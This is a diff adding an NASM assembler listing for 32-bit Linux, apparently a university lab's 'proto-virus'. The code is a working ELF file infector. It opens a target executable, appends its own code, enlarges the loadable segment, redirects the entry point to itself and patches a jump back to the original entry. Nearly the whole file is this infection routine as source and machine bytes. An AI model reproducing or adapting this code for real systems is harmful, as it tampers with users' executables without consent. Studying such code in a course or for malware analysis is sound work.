@@ -1,0 +1,463 @@
+     1                                  %macro	syscall1 2
+     2                                  	mov	ebx, %2
+     3                                  	mov	eax, %1
+     4                                  	int	0x80
+     5                                  %endmacro
+     6                                  
+     7                                  %macro	syscall3 4
+     8                                  	mov	edx, %4
+     9                                  	mov	ecx, %3
+    10                                  	mov	ebx, %2
+    11                                  	mov	eax, %1
+    12                                  	int	0x80
+    13                                  %endmacro
+    14                                  
+    15                                  %macro  exit 1
+    16                                  	syscall1 1, %1
+    17                                  %endmacro
+    18                                  
+    19                                  %macro  write 3
+    20                                  	syscall3 4, %1, %2, %3
+    21                                  %endmacro
+    22                                  
+    23                                  %macro  read 3
+    24                                  	syscall3 3, %1, %2, %3
+    25                                  %endmacro
+    26                                  
+    27                                  %macro  open 3
+    28                                  	syscall3 5, %1, %2, %3
+    29                                  %endmacro
+    30                                  
+    31                                  %macro  lseek 3
+    32                                  	syscall3 19, %1, %2, %3
+    33                                  %endmacro
+    34                                  
+    35                                  %macro  close 1
+    36                                  	syscall1 6, %1
+    37                                  %endmacro
+    38                                  
+    39                                  %define	STK_RES	200
+    40                                  %define	RDWR	2
+    41                                  %define	SEEK_END 2
+    42                                  %define SEEK_CUR 1
+    43                                  %define SEEK_SET 0
+    44                                  
+    45                                  %define ENTRY		24
+    46                                  %define PHDR_start	28
+    47                                  %define	PHDR_size	32
+    48                                  %define PHDR_memsize	20	
+    49                                  %define PHDR_filesize	16
+    50                                  %define	PHDR_offset	4
+    51                                  %define	PHDR_vaddr	8
+    52                                  
+    53                                  ; hi
+    54                                  %define STDOUT 1
+    55                                  %define STDERR 2
+    56                                  
+    57                                  %define file_header_size	52
+    58                                  
+    59                                  %define ph_offset	28
+    60                                  %define ph_entry_size	32 ; 40?
+    61                                  %define PT_LOAD		1
+    62                                  
+    63                                  
+    64                                  %define off_base_addr	4
+    65                                  %define off_fd		8
+    66                                  %define off_size	12
+    67                                  %define off_magnum	16
+    68                                  %define off_entry	20
+    69                                  %define off_new_entry	24
+    70                                  %define off_opcode_mov_eax	31
+    71                                  %define off_opcode_entry	30
+    72                                  %define off_opcode_jmp_eax	26
+    73                                  %define off_exit_code		35
+    74                                  %define off_ph_offset		39
+    75                                  %define off_ph_entry_size	41
+    76                                  %define off_ph_entry_count	43
+    77                                  %define off_start_vaddr		47
+    78                                  %define off_ph_type		51
+    79                                  %define off_file_size		55
+    80                                  %define off_mem_size		59
+    81                                  %define off_new_filesize	63
+    82                                  %define off_new_memsize		67
+    83                                  %define off_file_header		67+file_header_size ; = 119
+    84                                  
+    85                                  %define magsize 4
+    86                                  %define magnum	0x464c457f ; = '.ELF' in little indian
+    87                                  
+    88                                  %define opcode_mov_eax			0xb8
+    89                                  %define opcode_jmp_eax			0xe0ff ; flipped because of little indian...
+    90                                  %define opcode_size_mov_eax		1
+    91                                  %define opcode_size_jmp_eax		2
+    92                                  
+    93                                  %define program_headers_start		52
+    94                                  %define program_headers_entry_size	32
+    95                                  %define file_header_size		52
+    96                                  
+    97                                  %macro set_errorno 1
+    98                                  	mov [ebp-off_exit_code], dword %1
+    99                                  %endmacro
+   100                                  
+   101                                  	global _start
+   102                                  
+   103                                  	section .text
+   104 00000000 55                      _start:	push	ebp
+   105 00000001 89E5                    	mov	ebp, esp
+   106 00000003 81ECC8000000            	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+   107                                  	
+   108                                  	; take base address
+   109 00000009 E800000000              	call base_address
+   110                                  	base_address:
+   111 0000000E 58                      	pop eax
+   112 0000000F 8945FC                  	mov [ebp-off_base_addr], eax
+   113                                  	
+   114                                  	; reset exit code
+   115                                  	set_errorno dword 0
+   116 00000012 C745DD00000000      <1>  mov [ebp-off_exit_code], dword %1
+   117                                  	
+   118                                  	; write virus threatening sentence
+   119 00000019 8B45FC                  	mov eax, dword [ebp-off_base_addr]
+   120 0000001C 2D0BFDFFFF              	sub eax, dword base_address-OutStr
+   121                                  	write STDOUT, eax, OutStr_length
+   122                              <1>  syscall3 4, %1, %2, %3
+   123 00000021 BA20000000          <2>  mov edx, %4
+   124 00000026 89C1                <2>  mov ecx, %3
+   125 00000028 BB01000000          <2>  mov ebx, %2
+   126 0000002D B804000000          <2>  mov eax, %1
+   127 00000032 CD80                <2>  int 0x80
+   128                                  	
+   129 00000034 8B45FC                  	mov eax, dword [ebp-off_base_addr]
+   130 00000037 2D13FDFFFF              	sub eax, dword base_address-FileName
+   131                                  	open eax, RDWR, 0
+   132                              <1>  syscall3 5, %1, %2, %3
+   133 0000003C BA00000000          <2>  mov edx, %4
+   134 00000041 B902000000          <2>  mov ecx, %3
+   135 00000046 89C3                <2>  mov ebx, %2
+   136 00000048 B805000000          <2>  mov eax, %1
+   137 0000004D CD80                <2>  int 0x80
+   138 0000004F 83F800                  	cmp eax, dword 0
+   139 00000052 7D27                    	jge .fileOK
+   140                                  	; error
+   141 00000054 8B45FC                  	mov eax, dword [ebp-off_base_addr]
+   142 00000057 2DEBFCFFFF              	sub eax, dword base_address-Failstr
+   143                                  	write STDERR, eax, Failstr_length
+   144                              <1>  syscall3 4, %1, %2, %3
+   145 0000005C BA0D000000          <2>  mov edx, %4
+   146 00000061 89C1                <2>  mov ecx, %3
+   147 00000063 BB02000000          <2>  mov ebx, %2
+   148 00000068 B804000000          <2>  mov eax, %1
+   149 0000006D CD80                <2>  int 0x80
+   150                                  	set_errorno dword 1
+   151 0000006F C745DD01000000      <1>  mov [ebp-off_exit_code], dword %1
+   152 00000076 E974020000              	jmp VirusExit
+   153                                  	.fileOK:
+   154                                  	; backup fd
+   155 0000007B 8945F8                  	mov [ebp-off_fd], dword eax
+   156                                  	
+   157                                  	; read magic number
+   158 0000007E 89E8                    	mov eax, ebp
+   159 00000080 83E810                  	sub eax, off_magnum ; eax now equals to ebp-off_magnum, which is where the magic number is going to be read into
+   160                                  	read [ebp-off_fd], eax, magsize ; read magic number into [ebp-off_magnum]
+   161                              <1>  syscall3 3, %1, %2, %3
+   162 00000083 BA04000000          <2>  mov edx, %4
+   163 00000088 89C1                <2>  mov ecx, %3
+   164 0000008A 8B5DF8              <2>  mov ebx, %2
+   165 0000008D B803000000          <2>  mov eax, %1
+   166 00000092 CD80                <2>  int 0x80
+   167 00000094 8B45F0                  	mov eax, dword [ebp-off_magnum]
+   168                                  	magnumm:
+   169                                  	; check magic number
+   170 00000097 817DF07F454C46          	cmp [ebp-off_magnum], dword magnum
+   171 0000009E 740C                    	je .isElfFile
+   172                                  	set_errorno dword 2
+   173 000000A0 C745DD02000000      <1>  mov [ebp-off_exit_code], dword %1
+   174 000000A7 E943020000              	jmp VirusExit
+   175                                  	.isElfFile:
+   176                                  	; move to the end of the file
+   177                                  	lseek [ebp-off_fd], 0, SEEK_END
+   178                              <1>  syscall3 19, %1, %2, %3
+   179 000000AC BA02000000          <2>  mov edx, %4
+   180 000000B1 B900000000          <2>  mov ecx, %3
+   181 000000B6 8B5DF8              <2>  mov ebx, %2
+   182 000000B9 B813000000          <2>  mov eax, %1
+   183 000000BE CD80                <2>  int 0x80
+   184                                  	
+   185                                  	; backup size
+   186 000000C0 8945F4                  	mov [ebp-off_size], eax
+   187                                  	
+   188                                  	; write virus to file
+   189 000000C3 8B45FC                  	mov eax, dword [ebp-off_base_addr]
+   190 000000C6 83E80E                  	sub eax, dword base_address-_start
+   191                                  	write [ebp-off_fd], eax, virus_end-_start
+   192                              <1>  syscall3 4, %1, %2, %3
+   193 000000C9 BA34030000          <2>  mov edx, %4
+   194 000000CE 89C1                <2>  mov ecx, %3
+   195 000000D0 8B5DF8              <2>  mov ebx, %2
+   196 000000D3 B804000000          <2>  mov eax, %1
+   197 000000D8 CD80                <2>  int 0x80
+   198 000000DA 83F800                  	cmp eax, 0
+   199 000000DD 7F0C                    	jg .write_ok
+   200                                  	set_errorno dword 3
+   201 000000DF C745DD03000000      <1>  mov [ebp-off_exit_code], dword %1
+   202 000000E6 E904020000              	jmp VirusExit
+   203                                  	.write_ok:
+   204                                  	
+   205                                  	
+   206                                  	; read program headers offset
+   207                                  	lseek [ebp-off_fd], ph_offset, SEEK_SET
+   208                              <1>  syscall3 19, %1, %2, %3
+   209 000000EB BA00000000          <2>  mov edx, %4
+   210 000000F0 B91C000000          <2>  mov ecx, %3
+   211 000000F5 8B5DF8              <2>  mov ebx, %2
+   212 000000F8 B813000000          <2>  mov eax, %1
+   213 000000FD CD80                <2>  int 0x80
+   214 000000FF 89E8                    	mov eax, ebp
+   215 00000101 83E827                  	sub eax, dword off_ph_offset
+   216                                  	read [ebp-off_fd], eax, 4
+   217                              <1>  syscall3 3, %1, %2, %3
+   218 00000104 BA04000000          <2>  mov edx, %4
+   219 00000109 89C1                <2>  mov ecx, %3
+   220 0000010B 8B5DF8              <2>  mov ebx, %2
+   221 0000010E B803000000          <2>  mov eax, %1
+   222 00000113 CD80                <2>  int 0x80
+   223                                  	
+   224                                  	; read program headers entry size and entry count
+   225                                  	lseek [ebp-off_fd], ph_entry_size, SEEK_SET
+   226                              <1>  syscall3 19, %1, %2, %3
+   227 00000115 BA00000000          <2>  mov edx, %4
+   228 0000011A B920000000          <2>  mov ecx, %3
+   229 0000011F 8B5DF8              <2>  mov ebx, %2
+   230 00000122 B813000000          <2>  mov eax, %1
+   231 00000127 CD80                <2>  int 0x80
+   232 00000129 89E8                    	mov eax, ebp
+   233 0000012B 83E829                  	sub eax, dword off_ph_entry_size
+   234                                  	read [ebp-off_fd], eax, 2
+   235                              <1>  syscall3 3, %1, %2, %3
+   236 0000012E BA02000000          <2>  mov edx, %4
+   237 00000133 89C1                <2>  mov ecx, %3
+   238 00000135 8B5DF8              <2>  mov ebx, %2
+   239 00000138 B803000000          <2>  mov eax, %1
+   240 0000013D CD80                <2>  int 0x80
+   241                                  	
+   242                                  	
+   243 0000013F 8B4DD9                  	mov ecx, dword [ebp-off_ph_offset]
+   244                                  	lseek [ebp-off_fd], ecx, SEEK_SET
+   245                              <1>  syscall3 19, %1, %2, %3
+   246 00000142 BA00000000          <2>  mov edx, %4
+   247 00000147 89C9                <2>  mov ecx, %3
+   248 00000149 8B5DF8              <2>  mov ebx, %2
+   249 0000014C B813000000          <2>  mov eax, %1
+   250 00000151 CD80                <2>  int 0x80
+   251 00000153 8B4DD7                  	mov ecx, dword [ebp-off_ph_entry_size]
+   252 00000156 89E8                    	mov eax, ebp
+   253 00000158 83E833                  	sub eax, dword off_ph_type
+   254                                  	.header_seek_loop_start:
+   255                                  	; read program header
+   256                                  	read [ebp-off_fd], eax, 4
+   257                              <1>  syscall3 3, %1, %2, %3
+   258 0000015B BA04000000          <2>  mov edx, %4
+   259 00000160 89C1                <2>  mov ecx, %3
+   260 00000162 8B5DF8              <2>  mov ebx, %2
+   261 00000165 B803000000          <2>  mov eax, %1
+   262 0000016A CD80                <2>  int 0x80
+   263                                  	; compare type tp PT_LOAD
+   264 0000016C 837DCD01                	cmp [ebp-off_ph_type], dword PT_LOAD
+   265 00000170 7416                    	je .found_LOAD_header	; found the right header
+   266                                  	; loop step
+   267 00000172 83E904                  	sub ecx, dword 4
+   268                                  	lseek [ebp-off_fd], ecx, SEEK_CUR
+   269                              <1>  syscall3 19, %1, %2, %3
+   270 00000175 BA01000000          <2>  mov edx, %4
+   271 0000017A 89C9                <2>  mov ecx, %3
+   272 0000017C 8B5DF8              <2>  mov ebx, %2
+   273 0000017F B813000000          <2>  mov eax, %1
+   274 00000184 CD80                <2>  int 0x80
+   275 00000186 EBD3                    	jmp .header_seek_loop_start
+   276                                  	.found_LOAD_header:
+   277                                  	lseek [ebp-off_fd], PHDR_vaddr-4, SEEK_CUR
+   278                              <1>  syscall3 19, %1, %2, %3
+   279 00000188 BA01000000          <2>  mov edx, %4
+   280 0000018D B904000000          <2>  mov ecx, %3
+   281 00000192 8B5DF8              <2>  mov ebx, %2
+   282 00000195 B813000000          <2>  mov eax, %1
+   283 0000019A CD80                <2>  int 0x80
+   284 0000019C 89E8                    	mov eax, ebp
+   285 0000019E 83E82F                  	sub eax, dword off_start_vaddr
+   286                                  	read [ebp-off_fd], eax, 4
+   287                              <1>  syscall3 3, %1, %2, %3
+   288 000001A1 BA04000000          <2>  mov edx, %4
+   289 000001A6 89C1                <2>  mov ecx, %3
+   290 000001A8 8B5DF8              <2>  mov ebx, %2
+   291 000001AB B803000000          <2>  mov eax, %1
+   292 000001B0 CD80                <2>  int 0x80
+   293                                  	
+   294                                  	
+   295                                  	; calculate new filesize
+   296                                  	lseek [ebp-off_fd], PHDR_filesize-PHDR_vaddr-4, SEEK_CUR
+   297                              <1>  syscall3 19, %1, %2, %3
+   298 000001B2 BA01000000          <2>  mov edx, %4
+   299 000001B7 B904000000          <2>  mov ecx, %3
+   300 000001BC 8B5DF8              <2>  mov ebx, %2
+   301 000001BF B813000000          <2>  mov eax, %1
+   302 000001C4 CD80                <2>  int 0x80
+   303 000001C6 89E8                    	mov eax, ebp
+   304 000001C8 83E837                  	sub eax, dword off_file_size
+   305                                  	read [ebp-off_fd], eax, 4
+   306                              <1>  syscall3 3, %1, %2, %3
+   307 000001CB BA04000000          <2>  mov edx, %4
+   308 000001D0 89C1                <2>  mov ecx, %3
+   309 000001D2 8B5DF8              <2>  mov ebx, %2
+   310 000001D5 B803000000          <2>  mov eax, %1
+   311 000001DA CD80                <2>  int 0x80
+   312 000001DC 8B45C9                  	mov eax, dword [ebp-off_file_size]
+   313 000001DF 0534030000              	add eax, virus_end-_start
+   314 000001E4 8945C1                  	mov [ebp-off_new_filesize], dword eax
+   315                                  	
+   316                                  	; calculate new memsize
+   317 000001E7 89E8                    	mov eax, ebp
+   318 000001E9 83E83B                  	sub eax, dword off_mem_size
+   319                                  	read [ebp-off_fd], eax, 4
+   320                              <1>  syscall3 3, %1, %2, %3
+   321 000001EC BA04000000          <2>  mov edx, %4
+   322 000001F1 89C1                <2>  mov ecx, %3
+   323 000001F3 8B5DF8              <2>  mov ebx, %2
+   324 000001F6 B803000000          <2>  mov eax, %1
+   325 000001FB CD80                <2>  int 0x80
+   326 000001FD 8B45C5                  	mov eax, dword [ebp-off_mem_size]
+   327 00000200 0534030000              	add eax, virus_end-_start
+   328 00000205 8945BD                  	mov [ebp-off_new_memsize], dword eax
+   329                                  	
+   330                                  	
+   331                                  	
+   332                                  	; change filesize, memsize in file header
+   333                                  	lseek [ebp-off_fd], PHDR_filesize-PHDR_memsize-4, SEEK_CUR ; set the file for writing to size in program header 
+   334                              <1>  syscall3 19, %1, %2, %3
+   335 00000208 BA01000000          <2>  mov edx, %4
+   336 0000020D B9F8FFFFFF          <2>  mov ecx, %3
+   337 00000212 8B5DF8              <2>  mov ebx, %2
+   338 00000215 B813000000          <2>  mov eax, %1
+   339 0000021A CD80                <2>  int 0x80
+   340                                  	
+   341 0000021C 89E8                    	mov eax, ebp
+   342 0000021E 83E83F                  	sub eax, dword off_new_filesize
+   343                                  	write [ebp-off_fd], eax, 4 ; overwrite filesize
+   344                              <1>  syscall3 4, %1, %2, %3
+   345 00000221 BA04000000          <2>  mov edx, %4
+   346 00000226 89C1                <2>  mov ecx, %3
+   347 00000228 8B5DF8              <2>  mov ebx, %2
+   348 0000022B B804000000          <2>  mov eax, %1
+   349 00000230 CD80                <2>  int 0x80
+   350                                  	
+   351 00000232 89E8                    	mov eax, ebp
+   352 00000234 83E843                  	sub eax, dword off_new_memsize
+   353                                  	write [ebp-off_fd], eax, 4 ; overwrite memsize
+   354                              <1>  syscall3 4, %1, %2, %3
+   355 00000237 BA04000000          <2>  mov edx, %4
+   356 0000023C 89C1                <2>  mov ecx, %3
+   357 0000023E 8B5DF8              <2>  mov ebx, %2
+   358 00000241 B804000000          <2>  mov eax, %1
+   359 00000246 CD80                <2>  int 0x80
+   360                                  	
+   361                                  	
+   362                                  	entry:
+   363                                  	; set fd on the entry point location
+   364                                  	lseek [ebp-off_fd], ENTRY, SEEK_SET
+   365                              <1>  syscall3 19, %1, %2, %3
+   366 00000248 BA00000000          <2>  mov edx, %4
+   367 0000024D B918000000          <2>  mov ecx, %3
+   368 00000252 8B5DF8              <2>  mov ebx, %2
+   369 00000255 B813000000          <2>  mov eax, %1
+   370 0000025A CD80                <2>  int 0x80
+   371                                  	; read entry point to [ebp-off_entry]
+   372 0000025C 89E8                    	mov eax, ebp
+   373 0000025E 83E814                  	sub eax, off_entry ; eax = pointer to stack at off_entry (ebp-off_entry)
+   374                                  	read [ebp-off_fd], eax, 4
+   375                              <1>  syscall3 3, %1, %2, %3
+   376 00000261 BA04000000          <2>  mov edx, %4
+   377 00000266 89C1                <2>  mov ecx, %3
+   378 00000268 8B5DF8              <2>  mov ebx, %2
+   379 0000026B B803000000          <2>  mov eax, %1
+   380 00000270 CD80                <2>  int 0x80
+   381                                  	
+   382                                  	; write entry point
+   383 00000272 8B45F4                  	mov eax, dword [ebp-off_size]
+   384 00000275 0345D1                  	add eax, dword [ebp-off_start_vaddr]
+   385 00000278 8945E8                  	mov [ebp-off_new_entry], dword eax
+   386                                  	; set fd on the entry point location
+   387                                  	lseek [ebp-off_fd], ENTRY, SEEK_SET
+   388                              <1>  syscall3 19, %1, %2, %3
+   389 0000027B BA00000000          <2>  mov edx, %4
+   390 00000280 B918000000          <2>  mov ecx, %3
+   391 00000285 8B5DF8              <2>  mov ebx, %2
+   392 00000288 B813000000          <2>  mov eax, %1
+   393 0000028D CD80                <2>  int 0x80
+   394                                  	; write new entry point to file header
+   395 0000028F 89E8                    	mov eax, ebp
+   396 00000291 83E818                  	sub eax, dword off_new_entry
+   397                                  	write [ebp-off_fd], eax, 4
+   398                              <1>  syscall3 4, %1, %2, %3
+   399 00000294 BA04000000          <2>  mov edx, %4
+   400 00000299 89C1                <2>  mov ecx, %3
+   401 0000029B 8B5DF8              <2>  mov ebx, %2
+   402 0000029E B804000000          <2>  mov eax, %1
+   403 000002A3 CD80                <2>  int 0x80
+   404                                  	
+   405                                  	; write new instruction to 'jmp old_entry' istead of 'exit 0' in VirusExit in file
+   406                                  	; set opcode and jump location in opcodes places in stack
+   407 000002A5 C645E1B8                	mov [ebp-off_opcode_mov_eax], byte opcode_mov_eax
+   408 000002A9 C745E6FFE00000          	mov [ebp-off_opcode_jmp_eax], dword opcode_jmp_eax
+   409 000002B0 8B45EC                  	mov eax, dword [ebp-off_entry]
+   410 000002B3 8945E2                  	mov dword [ebp-off_opcode_entry], eax
+   411                                  	
+   412                                  	; find VirusExit at the end of the file
+   413 000002B6 B8EF020000              	mov eax, dword VirusExit-_start
+   414 000002BB 0345F4                  	add eax, [ebp-off_size]
+   415                                  	lseek [ebp-off_fd], eax, SEEK_SET
+   416                              <1>  syscall3 19, %1, %2, %3
+   417 000002BE BA00000000          <2>  mov edx, %4
+   418 000002C3 89C1                <2>  mov ecx, %3
+   419 000002C5 8B5DF8              <2>  mov ebx, %2
+   420 000002C8 B813000000          <2>  mov eax, %1
+   421 000002CD CD80                <2>  int 0x80
+   422                                  	
+   423                                  	; point to opcodes in stuck with eax
+   424 000002CF 89E8                    	mov eax, ebp
+   425 000002D1 83E81F                  	sub eax, dword off_opcode_mov_eax
+   426                                  	write [ebp-off_fd], eax, opcode_size_mov_eax+4+opcode_size_jmp_eax
+   427                              <1>  syscall3 4, %1, %2, %3
+   428 000002D4 BA07000000          <2>  mov edx, %4
+   429 000002D9 89C1                <2>  mov ecx, %3
+   430 000002DB 8B5DF8              <2>  mov ebx, %2
+   431 000002DE B804000000          <2>  mov eax, %1
+   432 000002E3 CD80                <2>  int 0x80
+   433                                  	
+   434                                  	
+   435                                  	close [ebp-off_fd]
+   436                              <1>  syscall1 6, %1
+   437 000002E5 8B5DF8              <2>  mov ebx, %2
+   438 000002E8 B806000000          <2>  mov eax, %1
+   439 000002ED CD80                <2>  int 0x80
+   440                                  VirusExit:
+   441 000002EF 8B45DD                  	mov eax, dword [ebp-off_exit_code]
+   442                                  	exit eax            ; Termination if all is OK and no previous code to jump to
+   443                              <1>  syscall1 1, %1
+   444 000002F2 89C3                <2>  mov ebx, %2
+   445 000002F4 B801000000          <2>  mov eax, %1
+   446 000002F9 CD80                <2>  int 0x80
+   447                                  			  ; (also an example for use of above macros)
+   448                                  	
+   449 000002FB 454C466578656300        FileName:	db "ELFexec", 0
+   450                                  FileName_length:equ $ - FileName
+   451 00000303 546865206C61622039-     OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+   452 0000030C 2070726F746F2D7669-
+   453 00000315 72757320737472696B-
+   454 0000031E 6573210A00         
+   455                                  OutStr_length:	equ $ - OutStr
+   456 00000323 70657268617073206E-     Failstr:        db "perhaps not", 10 , 0
+   457 0000032C 6F740A00           
+   458                                  Failstr_length:	equ $ - Failstr
+   459                                  
+   460 00000330 [EF020000]              PreviousEntryPoint: dd VirusExit
+   461                                  virus_end:
+   462                                  
+   463                                  
